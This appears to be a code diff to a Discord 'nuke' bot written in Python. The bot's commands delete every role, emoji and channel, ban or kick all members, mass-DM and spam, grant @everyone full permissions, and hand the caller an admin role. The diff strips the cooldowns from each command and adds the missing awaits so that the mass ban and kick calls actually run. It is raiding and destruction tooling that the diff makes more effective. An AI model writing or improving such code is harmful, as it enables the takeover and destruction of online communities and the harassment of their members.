@@ -34,14 +34,12 @@ async def on_ready():
 	print(Fore.RED + f"Account: {Fore.YELLOW}{bot.user}\n{Fore.RED}id: {Fore.YELLOW}{bot.user.id}\n{Fore.RED}Prefix: {Fore.YELLOW}botprefix\n\n{Fore.GREEN}")
 #Nuke
 @bot.command()
-@commands.cooldown(1, 300, commands.BucketType.user)
 async def deleteroles(ctx):
 	try: await ctx.message.delete()
 	except: pass
 	for role in ctx.guild.roles:
 		asyncio.create_task(delete(role))
 @bot.command()
-@commands.cooldown(1, 300, commands.BucketType.user)
 async def deleteemojis(ctx):
 	try: await ctx.message.delete()
 	except: pass
@@ -64,7 +62,6 @@ async def nuke(ctx):
 	asyncio.create_task(deletechannels(ctx))
 #spamobj
 @bot.command()
-@commands.cooldown(1, 300, commands.BucketType.user)
 async def channels(ctx):
 	try: await ctx.message.delete()
 	except: pass
@@ -72,7 +69,6 @@ async def channels(ctx):
 		try: await ctx.guild.create_text_channel(name="channelname")
 		except: break
 @bot.command()
-@commands.cooldown(1, 300, commands.BucketType.user)
 async def roles(ctx):
 	try: await ctx.message.delete()
 	except: pass
@@ -81,10 +77,9 @@ async def roles(ctx):
 		except: break
 #banall
 async def ban(member):
-	try: member.ban(reason="banreason")
+	try: await member.ban(reason="banreason")
 	except: pass
 @bot.command()
-@commands.cooldown(1, 300, commands.BucketType.user)
 async def banall(ctx):
 	try: await ctx.message.delete()
 	except: pass
@@ -94,10 +89,9 @@ async def banall(ctx):
 		else:
 			pass
 async def kick(member):
-	try: member.kick(reason="banreason")
+	try: await member.kick(reason="banreason")
 	except: pass
 @bot.command()
-@commands.cooldown(1, 300, commands.BucketType.user)
 async def kickall(ctx):
 	try: await ctx.message.delete()
 	except: pass
@@ -111,7 +105,6 @@ async def dm(member):
 	try: await member.send("spammessage")
 	except: pass
 @bot.command()
-@commands.cooldown(1, 300, commands.BucketType.user)
 async def dmall(ctx):
 	try: await ctx.message.delete()
 	except: pass
@@ -122,7 +115,6 @@ async def spam1(channel):
 		try: await channel.send(content="spammessage")
 		except: break
 @bot.command()
-@commands.cooldown(1, 300, commands.BucketType.user)
 async def spam(ctx):
 	try: await ctx.message.delete()
 	except: pass
@@ -130,7 +122,6 @@ async def spam(ctx):
 		asyncio.create_task(spam1(channel))
 #guild
 @bot.command()
-@commands.cooldown(1, 300, commands.BucketType.user)
 async def rename(ctx):
 	try: await ctx.message.delete()
 	except: pass
@@ -144,7 +135,6 @@ async def on_guild_channel_create(channel):
 	else:
 		pass
 @bot.command()
-@commands.cooldown(1, 300, commands.BucketType.user)
 async def admin(ctx):
 	try: await ctx.message.delete()
 	except: pass
@@ -153,14 +143,12 @@ async def admin(ctx):
 	role = discord.utils.get(ctx.guild.roles, name=amogus)
 	await ctx.author.add_roles(role)
 @bot.command()
-@commands.cooldown(1, 300, commands.BucketType.user)
 async def adminall(ctx):
 	try: await ctx.message.delete()
 	except: pass
 	role = discord.utils.get(ctx.guild.roles, name="@everyone")
 	await role.edit(permissions=discord.Permissions.all())
 @bot.command()
-@commands.cooldown(1, 300, commands.BucketType.user)
 async def crash(ctx):
 	try: await ctx.message.delete()
 	except: pass
